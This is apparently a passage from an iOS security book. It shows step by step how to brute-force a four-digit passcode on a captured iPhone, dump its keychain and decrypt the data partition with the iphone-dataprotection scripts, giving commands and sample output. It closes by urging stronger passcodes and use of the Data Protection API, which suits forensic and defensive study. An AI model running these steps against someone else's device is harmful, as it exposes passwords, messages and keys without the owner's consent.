### Port Forwarding
Forward the local port 1999 to the remote port 1999.

### DFU Mode Instructions
Refer to Figure 3.2 for instructions on how to put the device into DFU mode. If you need guidance, click the "Next" button to follow the steps provided by redsn0w.

### SSH Access and tcprelay.sh
Many of the included Python scripts require SSH access to the target device. To maintain this connection, keep `tcprelay.sh` running in a separate Terminal tab or window while you are acquiring data from the device.

### Brute-Force Attacking Four-Digit Passcodes
To decrypt protected items in the keychain or on the filesystem, you must recover and decrypt the system keybag. If no passcode is set, the keybag can be easily decrypted. If a simple four-digit passcode is used, it must be guessed. The `demo_bruteforce.py` script can perform this attack and guess any four-digit passcode within approximately 20 minutes.

#### Running the Script
Run the following command from your desktop to SSH into the iOS device, retrieve, and decrypt the system keybag:

```sh
$ python python_scripts/demo_bruteforce.py
```

Example output:
```
Device UDID: e8a27a5ee1eacdcb29ed683186ef5b2393c59e5a
Keybag: SIGN check OK
Keybag UUID: 11d1928f9a1f491fb87fb9991b1c3ec6
Saving /Users/admin/Desktop/iphone-dataprotection/e8a27a5ee1eacdcb29ed683186ef5b2393c59e5a/9dd7912fb6f996e9.plist
passcodeKeyboardComplexity: {'rangeMinimum': 0, 'value': 0, 'rangeMaximum': 2}
Trying all 4-digit passcodes...
BruteforceSystemKeyBag: 0:03:41.735334
{'passcode': '1234', 'passcodeKey': '497ea264862390cc13a9eebc118f7ec65c80192787c6b3259b88c62331572ed4'}
True
Keybag type: System keybag (0)
Keybag version: 3
Class WRAP Type Key
1 3 0
f2680d6bcdde71a1fae1c3a538e7bbe0f0495e7f75831959f10a41497675f490
2 3 1
01133605e634ecfa168a3371351f36297e2ce599768204fd5073f8c9534c2472
3 3 0
cbd0a8627ad15b025a0b1e3e804cc61df85844cadb01720a2f282ce268e9922e
5 3 0
75a657a13941c98804cb43e395a8aebe92e345eaa9bc93dbe1563465b118e191
6 3 0
e0e4e1396f7eb7122877e7c307c65221029721f1d99f855c92b4cd2ed5a9adb1
7 3 0
a40677ed8dff8837c077496b7058991cc1200e8e04576b60505baff90c77be30
8 1 0
2d058bf0800a12470f65004fecaefaf86fbdfdb3d23a4c900897917697173f4c
9 3 0
098640c771d020cc1756c73ae87e686e5c170f794987d217eeca1616d0e9028d
10 3 0
661a4670023b754853aa059a79d60dbb77fc3e3711e5a1bd890f218c33e7f64c
11 1 0
669964beb0195dfa7207f6a976bf6849c0886de12bea73461e93fa274ff196a4
Saving /Users/admin/Desktop/iphone-dataprotection/e8a27a5ee1eacdcb29ed683186ef5b2393c59e5a/9dd7912fb6f996e9.plist
Downloaded keychain database, use keychain_tool.py to decrypt secrets
```

If the passcode was not set or successfully guessed, the system keybag and keychain database will be saved in a directory named with the UDID of the target device.

### Dumping Keychain
Once you have recovered the system keybag and backup keychain, you can decrypt the keychain using the `keychain_tool.py` script. This script requires the paths to the backup keychain and the system keybag as saved by `demo_bruteforce.py`.

Example usage:
```sh
$ python python_scripts/keychain_tool.py -ds e8a27a5ee1eacdcb29ed683186ef5b2393c59e5a/keychain-2.db e8a27a5ee1eacdcb29ed683186ef5b2393c59e5a/9dd7912fb6f996e9.plist
```

Example output:
```
Keybag: SIGN check OK
Keybag unlocked with passcode key
Keychain version: 5
------------------------------------------------------------
Passwords
------------------------------------------------------------
Service: AirPort
Account: MyHomeNetwork
Password: ab******
Agrp: apple
------------------------------------------------------------
Service: com.apple.managedconfiguration
Account: Private
Password: 
Agrp: apple
------------------------------------------------------------
Service: com.apple.certui
Account: https: simba.local - 446c9ccd 6ef09252 f3b4e55d 4df16dd3 [...]
Password: 
Agrp: com.apple.cfnetwork
------------------------------------------------------------
Service: com.apple.certui
Account: https: simba.local - 46c14e20 b83a2cef 86340d38 0720f560 [...]
Password: 
Agrp: com.apple.cfnetwork
------------------------------------------------------------
Service: push.apple.com
Account: 
Password: |
00000010 6e 99 eb 3c 9f 41 fa c7 91 c4 10 d6 b2 2f 21 b2 |n..<.A......./!.|
00000020 39 87 12 39 6d 5c 96 7d 4a bd a1 4a ea 49 ba 40 |9..9m\.}J..J.I.@|
00000030 96 53 c4 d3 81 0d 6e 73 98 6c 91 11 db e0 c2 3d |.S....ns.l.....=|
00000040 7a 17 82 35 18 59 fb 17 1a b2 51 89 fc 8b 55 5a |z..5.Y....Q...UZ|
00000050 95 04 a0 d6 2d d5 6a 6c e8 ad 65 df ea b4 a8 8b |....-.jl..e.....|
00000060 7e de c1 d2 b2 8a 30 e9 84 bb 08 9a 58 9a ad ba |~.....0.....X...|
00000070 bb ba b1 9e 2a 95 67 d7 be a1 4b a7 de 41 05 56 |....*.g...K..A.V|
00000080 d5 4e 8b d6 3b 57 45 d2 76 4e 67 c0 8b 10 45 d9 |.N..;WE.vNg...E.|
00000090 7b 2a c3 c9 11 f4 c5 f0 56 84 86 b7 46 fe 56 e8 |{*......V...F.V.|
```

### Decrypting Data Partition
To decrypt the file data, use the `emf_decrypter.py` script. This script uses the raw image of the data partition and the decrypted system keybag to decrypt all encrypted files on the filesystem.

Example usage:
```sh
$ python python_scripts/emf_decrypter.py e8a27a5ee1eacdcb29ed683186ef5b2393c59e5a/data_20120222-1450.dmg e8a27a5ee1eacdcb29ed683186ef5b2393c59e5a/9dd7912fb6f996e9.plist
```

Example output:
```
Keybag: SIGN check OK
Keybag unlocked with passcode key
cprotect version: 4
WARNING! This tool will modify the HFS image and possibly corrupt it if something goes wrong!
Make sure to back up the image before proceeding.
You can use the --nowrite option to do a dry run instead.
Press a key to continue or CTRL-C to abort.
Decrypting TrustStore.sqlite3
Decrypting keychain-2.db
[ ... ]
Decrypted 398 files
Failed to unwrap keys for: []
Not encrypted files: 19
```

If there were no errors, the script will have modified the disk image directly, so that all file contents are now decrypted and readable. You can verify this by mounting the disk image again and examining the SMS database, which was previously unreadable.

### Summary
The primary facility for encrypting sensitive user data in iOS is the Data Protection API, introduced in iOS 4. This API allows applications to declare which files and keychain items are sensitive and when they need to be available. The data is encrypted using keys derived from a unique device-specific AES key and optionally, the user’s passcode.

Attacks against data protection exploit the fact that default four-digit passcodes are easy to discover using brute force and that most data stored by iOS is not protected by the Data Protection API. Only the Mail application currently uses the Data Protection API to protect its data. An attacker may jailbreak a captured device and install custom tools to brute-force the owner’s passcode or boot from a custom ramdisk to perform the same attack. These attacks highlight the importance of application developers fully utilizing the Data Protection API and enterprises enforcing strong passcode requirements on iOS devices that handle sensitive data.